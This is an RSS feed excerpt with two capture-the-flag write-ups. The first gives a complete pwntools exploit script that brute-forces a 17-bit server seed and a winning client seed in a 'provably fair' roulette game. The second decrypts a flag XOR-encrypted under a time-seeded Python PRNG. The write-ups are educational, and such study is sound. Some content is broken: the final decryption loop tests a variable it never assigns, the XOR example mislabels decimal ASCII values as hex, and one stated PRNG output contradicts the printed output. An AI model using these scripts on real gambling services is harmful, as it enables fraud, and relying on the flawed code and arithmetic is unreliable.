<p>Here's the important part: in order to calculate the roulette number, the server seed gets <strong>concatenated</strong> with our seed and then it's turned into a hash. The hash is parsed into an integer, and once we calculate its module with 37, it will generate a number between 0 and 36, just like in a roulette. The color is also calculated, but we can overlook that as it doesn't help us get the flag:</p>
<pre><code class="language-python"># Generate game hash
combined = f"{server_seed}:{client_seed}"
game_hash = sha256(combined.encode()).hexdigest()
hash_int = int(game_hash, 16)
        
# Calculate roulette result
roulette_number = hash_int % 37  # 0-36
roulette_color = get_color(roulette_number)
</code></pre>
<h3>How it generates the number</h3>
<p>As we've seen, the server will generate a seed and will asks us for another one. Then, it will combine both seeds to generate a random number between 0 and 36. This is pretty much how the server gets the number.</p>
<h3>What do we know?</h3>
<p>We have a decent amount of data of how the server operates. We know:</p>
<ul>
<li>How the server <strong>generates the winning number</strong></li>
<li>Our <strong>client seed</strong> (since we give it to the server)</li>
<li>The <strong>hashed server seed</strong>.</li>
<li>The fact that the <strong>server seed</strong> is a random number of a <strong>fixed size</strong> (17 bits).</li>
</ul>
<p>Smell something fishy? With this data we have everything we need to get the flag, let's see how!</p>
<h3>The vulnerability</h3>
<p>Considering that the server allows us to introduce our own seed, all we need to do is provide one that <strong>we know</strong> will generate a 13. But how do we know if a client seed will generate a 13? Let's go back to the server script:</p>
<pre><code># Generate game hash
combined = f"{server_seed}:{client_seed}"
game_hash = sha256(combined.encode()).hexdigest()
hash_int = int(game_hash, 16)

# Calculate roulette result
roulette_number = hash_int % 37  # 0-36
roulette_color = get_color(roulette_number)
</code></pre>
<p>The way the number is generated is by <strong>combining the server and client seed</strong>. This means that if we knew the server seed, we could just <strong>bruteforce</strong> a winning client seed by generating a random client seed, concatenate it with the server seed, and calculating the number it would generate, until we find a seed that does indeed generate a 13. There's a slight issue though, <strong>we don't know the server seed</strong>. Or do we?</p>
<p>The server gives us it server seed hashed. However, we know that the length of the seed is 17 bits, so there's nothing stopping us from bruteforcing the server seed! All we need to do is to <strong>iterate through every number between 0 and 2¹⁷, generate its hash</strong>, and check if that hash is equal to the server hash the server has given us. That way, we'd get the <strong>seed number</strong>:</p>
<pre><code>def get_server_seed(server_seed_hash):
	i = 0
	for i in range(int(math.pow(2, 17))):
		potential_server_seed = sha256(bytes(i)).hexdigest()
		potential_server_seed_hash = sha256(potential_server_seed.encode()).hexdigest()
		if potential_server_seed_hash == server_seed_hash:
			break
	
	server_seed = sha256(bytes(i)).hexdigest()
	return server_seed
</code></pre>
<p>With this snippet, we can do just that.</p>
<p>By the way, I use <strong>pwntools</strong> to interact with the server and get the server seed (and later introduce my client seed). Considering that the winner flow of the output of the server is like this:</p>
<pre><code>Welcome to Provably Fair Roulette!
Server seed hash (verify later): &#x3C;random hash>
Enter your client seed (press enter to generate): &#x3C;winner hash>
Place your bet (number 0-36 or color red/black/green): 13

The wheel lands on: 13 (red)
Congratulations! You win!
...and you got 13, double congratulations!

Verification Details:
Server seed: &#x3C;random hash>
Client seed: &#x3C;winner hash>
Combined string: &#x3C;random hash>:&#x3C;winner hash>
Calculated number: 13
Resulting color: red
</code></pre>
<p>Here's how you can split the output to store the hashed server seed in a variable:</p>
<pre><code>conn = remote('localhost',8081) # The port my server was running on
# The challenge requires us to get the number 13 a total of 37 times in a row
for o in range(37):
	conn.recvline() # "Welcome to Provably Fair Roulette!"
	response = conn.recvline().decode().strip() # This line contains the hash
	server_hash = response.split()[5]
	
	print(f"Server hash: {server_hash}")
	
	# *Now* we get the server seed
	server_seed = get_server_seed(server_hash)
</code></pre>
<p>Now we have the server seed, which was the last piece we needed to be able to <strong>bruteforce a client seed that always generates the number 13</strong> on the roulette. Let's see how we can bruteforce the seed:</p>
<pre><code>def get_winner_client_seed(server_seed):
	client_seed = ""
	while True:
		# Randomly generate a seed
		client_seed = secrets.token_bytes(8).hex()
		# Combine it with the server seed
		combined = f"{server_seed}:{client_seed}"
		# Get the game hash with the combined seed
		game_hash = sha256(combined.encode()).hexdigest()
		hash_int = int(game_hash, 16)
		# Check if the roulette number of the hash is 13
		roulette_number = hash_int % 37 # 0-36
		if roulette_number == 13:
			break
	
	return client_seed
</code></pre>
<p>This generates a winner seed that, together with the server seed, will always generate the number 13. That's all the technicality of the challenge! Now we just need to complete the <strong>pwntools</strong> script to interact properly with the server.</p>
<p>First we generate the <strong>winner seed</strong> on the script, and then we use it as input:</p>
<pre><code># Gets a winner seed
winner_seed = get_winner_client_seed(server_seed)
print("Winner seed obtained")

# We wait a second because there's no delimiter because the server is now asking for input
# (There likely is a much better way to do this)
conn.recv(timeout=1)
# We send our winner seed as input
conn.sendline(winner_seed.encode())
</code></pre>
<p>Then the server will ask us which number do we think we'll be the winner. Since we know it will be 13, and that's the number we need to get 37 times in a row, we say it will be 13:</p>
<pre><code>conn.recv(timeout=1)
conn.sendline("13".encode())
</code></pre>
<p>By this point we've guessed correctly. To check that we did, we print the next two lines we receive from the server, and skip over the rest:</p>
<pre><code>conn.recvline()
# This will print that we indeed guessed right
print(conn.recvline())
print(conn.recvline())
# We skip over unnecessary information
for _ in range(8):
	conn.recvline()
</code></pre>
<p>And that's it! Now we just need to do it <strong>37 more times</strong>. So, putting it all together:</p>
<pre><code>from pwn import *
from hashlib import *
import secrets

def get_winner_client_seed(server_seed):
    client_seed = ""
    while True:     
        # Randomly generate a seed
        client_seed = secrets.token_bytes(8).hex()
        # Combine it with the server seed
        combined = f"{server_seed}:{client_seed}"
        # Get the game hash with the combined seed
        game_hash = sha256(combined.encode()).hexdigest()
        hash_int = int(game_hash, 16)
        
        # Check if the roulette number of the hash is 13
        roulette_number = hash_int % 37  # 0-36
        if roulette_number == 13:
            break
    
    return client_seed


def get_server_seed(server_seed_hash):
    i = 0
    for i in range(int(math.pow(2, 17))):
        potential_server_seed = sha256(bytes(i)).hexdigest()
        potential_server_seed_hash = sha256(potential_server_seed.encode()).hexdigest()
        if potential_server_seed_hash == server_seed_hash:
            break
    
    server_seed = sha256(bytes(i)).hexdigest()
    return server_seed


def main():
    conn = remote('localhost',8081)
    # The challenge requires us to get the number 13 a total of 37 times in a row
    for o in range(37):
		
        conn.recvline()
        response = conn.recvline().decode().strip() # This line contains the server hash
        server_hash = response.split()[5]
        print(f"Server hash: {server_hash}")
        
        # Gets the server seed
        server_seed = get_server_seed(server_hash)
        
        # Gets a winner seed
        winner_seed = get_winner_client_seed(server_seed)
        print("Winner seed obtained")
        
        # We wait a second because there's no delimiter because the server is now asking for input
        # (There likely is a much better way to do this)
        conn.recv(timeout=1)
        # We send our winner seed as input and guess that the number will be 13
        conn.sendline(winner_seed.encode())
        
        conn.recv(timeout=1)
        conn.sendline("13".encode())
        
        conn.recvline()
        # This will print that we indeed guessed right
        print(conn.recvline())
        print(conn.recvline())
        
        # We skip over unnecessary information
        for _ in range(8):    
            conn.recvline()
	
	
    # By this point we've guessed enough to get the flag
    conn.recvline()
    # Should print the flag
    print(conn.recvline())
    conn.close()


if __name__ == "__main__":
    main()
</code></pre>
<p>Notice how I print the flag after the loop.</p>
<h2>Conclusion</h2>
<p><strong>Bruteforcing</strong> is a very handy (and fun, in my opinion) tool that can help us obtain more data from data that we already have. Always keep an eye open for <strong>bruteforcing oportunities</strong> when you receive a hash!</p>
]]></description>
            <link>https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</link>
            <guid isPermaLink="true">https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</guid>
            <pubDate>Sat, 31 May 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[UMDCTF 2025: misc/find the seeds]]></title>
            <description><![CDATA[<h1>UMDCTF 2025: misc/find the seeds</h1>
<h4>April 30, 2025</h4>
<ul>
<li><strong>Name:</strong> find the seeds</li>
<li><strong>Description:</strong> can u help Alice find her seeds in the bin? She's pretty sure the bin hasn't been dumped since it was generated.</li>
</ul>
<p>In this challenge, we are given two files: a <strong>binary</strong> file (secret.bin) and a <strong>Python script</strong> (secret.py). Let's quickly check the binary file with <code>xxd</code>, which will allow us to see the <strong>hexadecimal data</strong> of the file:</p>
<pre><code>$ xxd secret.bin
00000000: 1047 a8b7 cafc c837 fc9d 71b2 bf29 dd08  .G.....7..q..)..
00000010: 2123 6106 3c0a ff1a f345 cedc 3d30 00e1  !#a.&#x3C;....E..=0..
00000020: 372b                                     7+   
</code></pre>
<p>Judging by the small length of the file and the fact that there is no apparent binary header, we can come to the conclusion that this is a binary file with <strong>raw hexadecimal data</strong> which is not meant to be executed. The bytes of the file don't ressemble any ASCII string either, at least not directly.</p>
<p>Let's open the <strong>Python script</strong> now:</p>
<pre><code>import random
import time

seed = int(time.time())
random.seed(seed)

plaintext = b"UMDCTF{REDACTED}"
keystream = bytes([random.getrandbits(8) for _ in range(len(plaintext))])
ciphertext = bytes([p ^ k for p, k in zip(plaintext, keystream)])

with open("secret.bin", "wb") as f:
f.write(ciphertext)
</code></pre>
<p>At first glance, it looks like this script writes into the binary file we were given. Judging by the name of the variable <code>ciphertext</code>, it turns out that some <strong>ciphered text</strong> is written into the file.</p>
<p>So all in all, it seems like the flag is hidden in <code>secret.bin</code> via some cipher algorithm performed in <code>secret.py</code>.</p>
<h2>Objective</h2>
<p>Our goal is to <strong>decipher the binary file</strong> to capture the flag, by finding the vulnerability in the script.</p>
<h2>Writeup</h2>
<h3>How does the flag get ciphered?</h3>
<p>Let's break down the script:</p>
<pre><code>import random
import time

# Generates a seed by using the current time
seed = int(time.time())
# Sets the generated seed to generate random numbers
random.seed(seed)
</code></pre>
<p>At the beginning of the code, we can see how the script uses <strong>randomness</strong> to cipher the file, because it generates a <strong>seed</strong>.</p>
<h3>What's a seed?</h3>
<p>It's difficult to generate random numbers. Well, "true" random numbers at least. In order to generate an actual random number you need a completely unpredictable system, and getting one is easier said that done. The "chaotic" nature of some physical processes like <strong>radioactive decay or thermal noise</strong> are some of these systems that can be used to generate actual random numbers, and simulating those processes takes time and resources.</p>
<p>Fortunately, conventional computers have an easy workaround: generating <strong>pseudo-random numbers</strong>. These numbers are not entirely random, but they <em>feel</em> random. Here's where seeds come into play.</p>
<p>A seed is just a number, any number. It's the initial value of a sequence of random numbers. Going back to Python, we can set a seed and generate a bunch of numbers like this:</p>
<pre><code>import random

# We set the seed
random.seed(42)
# We print five random numbers from 1 to 100
for _ in range(5):
	print(random.randint(1, 100))
</code></pre>
<p>This will output:</p>
<pre><code>82
15
4
95
36
</code></pre>
<p>The seed <code>42</code>'s first five pseudo-random numbers are 84, 15, 4, 95 and 36. Another seed, for example, <code>748349924</code>, has 64, 93, 35, 62 and 14 as the first numbers. Each seed has a <strong>different sequence</strong>, but this sequence does not change inside the scope of the algorithm you're using to generate random numbers. The seed <code>42</code> will <strong>always</strong> generate the same seemingly random sequence inside the algorithm you're using. Python's <code>random</code> library uses the <a href="https://es.wikipedia.org/wiki/Mersenne_twister">Mersenne Twister algorithm</a> in order to generate random numbers, as a matter of fact.</p>
<p>In order to select a seed, the usual go-to number is whatever <a href="https://www.unixtimestamp.com/">UNIX timestamp</a> you're on during runtime. This is convenient because it's a big, easy to obtain number that changes every second. In fact, this is precisely how the challenge script gets the seed:</p>
<pre><code>import random
import time

# Generates a seed by using the current time
seed = int(time.time())
# Sets the generated seed to generate random numbers
random.seed(seed)
</code></pre>
<h3>The cipher</h3>
<p>Now let's take a look at the lines that actually generate the ciphered text:</p>
<pre><code>plaintext = b"UMDCTF{REDACTED}" # Text that will be ciphered
# Creates a byte array of 8-bit-long random numbers up to the text length
keystream = bytes([random.getrandbits(8) for _ in range(len(plaintext))])
# Ciphers the text executing a XOR operation for each pair of characters
# in plaintext and keystream
ciphertext = bytes([p ^ k for p, k in zip(plaintext, keystream)])
</code></pre>
<p>First, it defines a string variable, containing the text that will be deciphered. In this case, a fake flag.</p>
<p>Then, it creates a byte array, and for each character in <code>plaintext</code>, it will append to said array a random number of 8 bits that generates with the <code>getrandbits()</code>function. This array of random numbers is what will create the ciphered text. Let's break down how it does it:</p>
<p>The <strong>for</strong> loop that is used to append to <code>ciphertext</code> uses a function called <code>zip()</code>. This function takes two strings and returns a list with <strong>character pairs</strong> of those strings. The pairs will have the N'th character of <code>plaintext</code> with the N'th character of <code>keystream</code>. The for loop takes each element of each pair with the <code>p</code> and <code>k</code> variables and performs a <code>XOR</code> operation (<code>^</code>) with them that will be appended to the array.</p>
<p>As an example, if we have the string <strong>"SEED"</strong> in <code>plaintext</code> and the numbers 0x78, 0x04, 0x65 and 0x12 in <code>keystream</code>, this would be the what's stored in <code>ciphertext</code>:</p>
<pre><code>0x83 0x69 0x69 0x68  ("SEED" in ASCII)
0x78 0x04 0x65 0x12  (the keystream)
-------------------  XOR
0xFB 0x6D 0x0C 0x7A  (ciphered text)
</code></pre>
<p>This is what gets written in <code>secret.bin</code>.</p>
<h3>Deciphering</h3>
<p>The written text is created by a <code>XOR</code> operation, so it would be natural to think that in order to decipher the text we'd need to <strong>undo</strong> the <code>XOR</code> operation. This is easy to do, as <code>XOR</code> is its own inverse, meaning that in order to undo the previous operation, we just need to <code>XOR</code> the result of it with one of its operands to obtain the other operand:</p>
<pre><code>0xFB 0x6D 0x0C 0x7A  (ciphered text)
0x78 0x04 0x65 0x12  (the keystream)
-------------------  XOR
0x83 0x69 0x69 0x68  ("SEED" in ASCII)
</code></pre>
<p>We've made some substancial progress up to this point. We know how the text is ciphered and how to decipher it. But here's the catch! While we do know how the cipher works, the algorithm relies on <strong>random numbers</strong>. The numbers used for ciphering the flag were created with an unknown seed, so our deciphering attempts will be futile. <strong>We don't have the keystream array that was used to cipher the flag, but if we find it, we will be able to decipher the flag.</strong></p>
<h3>The vulnerability</h3>
<p>Let's go back to square one. <strong>The seeds</strong>. There's a key property mentioned before that will allow us to find the breach to get the flag. <strong>A seed will always generate the same sequence of random numbers.</strong> This means that the only thing we need to get the keystream is the seed that was used to generate it. And, lo and behold, we do know how the seed was created!</p>
<pre><code>import random
import time

seed = int(time.time())
random.seed(seed)
</code></pre>
<p>The seed was created with the <code>time</code> library! Here's the vulnerability, because the seed is not an arbitrary number; it's the instance in which the flag was generated. This means that we can <strong>brute-force</strong> the flag by "<strong>going back in time</strong>" second by second with another script. For each second that we travel back into, we perform the reverse <code>XOR</code> operation until we get to the timestamp in which the flag was generated. Once we get there, the random keystream generated will be the same with which the flag was ciphered, and that will give us the last piece we need to perform the reverse operation. The script we need is pretty similar to the one the challenge gives us. Let's break it down step by step:</p>
<p>First, let's open the file and declare some variables:</p>
<pre><code>import random
import time

# We open the file and store in ciphertext the content of it
with open('secret.bin', 'rb') as file:
	ciphertext = file.read()

# We initialize the variable in which the deciphered text will be stored
decipheredtext = ""
# An incremental variable that will be used to go back in time
count = 0
# We get the current timestamp
seed = int(time.time())
</code></pre>
<p>Now, let's create the loop that will brute-force the flag:</p>
<pre><code># This loop will stop once the deciphered text contains "UMDCTF{" in it
while "UMDCTF{" not in str(decipheredtext):
	# For each iteration, we decrement the seed by one
	# This makes us go back in time second by second for each iteration
	random.seed(seed - count)
	# We generate the keystream of the seed
	keystream = bytes([random.getrandbits(8) for _ in range(len(ciphertext))])
	# We use the generated keystream to perform the reverse XOR operation
	# (Mind how now instead of using the plain text in zip() we use the ciphered text)
	deciphertext = bytes([p ^ k for p, k in zip(ciphertext, keystream)])

	count += 1
</code></pre>
<p>Because of the context of the challenge, we know that the flag starts with the string <code>"UMDCTF{"</code>. This comes in handy because we can use it as a stop condition. Once we find a deciphered text that starts like that, we can be sure that we've found the flag.</p>
<p>Now we just need to execute the script and wait for a few seconds (or more depending on when you execute the script, the more in the future you are relative to the stamp that was used for the seed), and sure enough, in due time, we'll get the flag!</p>
<p>Here's the full code, with a few output messages that print the flag and other info:</p>
<pre><code>import random
import time

with open('secret.bin', 'rb') as file:
	ciphertext = file.read()

decipheredtext = ""
count = 0
seed = int(time.time())

while "UMDCTF{" not in str(decipheredtext):
	random.seed(seed - count)

	keystream = bytes([random.getrandbits(8) for _ in range(len(ciphertext))])
	deciphertext = bytes([p ^ k for p, k in zip(ciphertext, keystream)])

	count += 1

print(f"Flag: {decipheredtext}")

print(f"Complete in {count} iterations")

print(f"Stamp in which the seed was generated: {int(time.time()) - count}")
</code></pre>
<h2>Conclusion</h2>
<p>Seed-based pseudo-random number generation algorithms are fine for <strong>casual, uncompromised uses</strong>. But as we've seen, <strong>these algorithms are not cryptographically safe</strong> and <strong>should not</strong> be used for password generation or similar uses.</p>
]]></description>
            <link>https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</link>
            <guid isPermaLink="true">https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</guid>
            <pubDate>Wed, 30 Apr 2025 00:00:00 GMT</pubDate>
        </item>
    </channel>
</rss>